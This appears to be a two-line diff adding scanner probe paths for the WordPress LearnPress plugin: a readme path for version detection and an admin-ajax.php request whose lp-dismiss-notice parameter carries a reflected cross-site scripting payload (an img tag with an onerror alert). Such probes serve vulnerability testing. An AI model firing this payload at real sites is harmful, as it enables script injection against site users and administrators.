@@ -1,0 +1,2 @@
+/wp-content/plugins/learnpress/readme.txt
+/wp-admin/admin-ajax.php?action=lp_background_single_email&lp-dismiss-notice=xxx<img%20src=x%20onerror=alert(document.domain)>
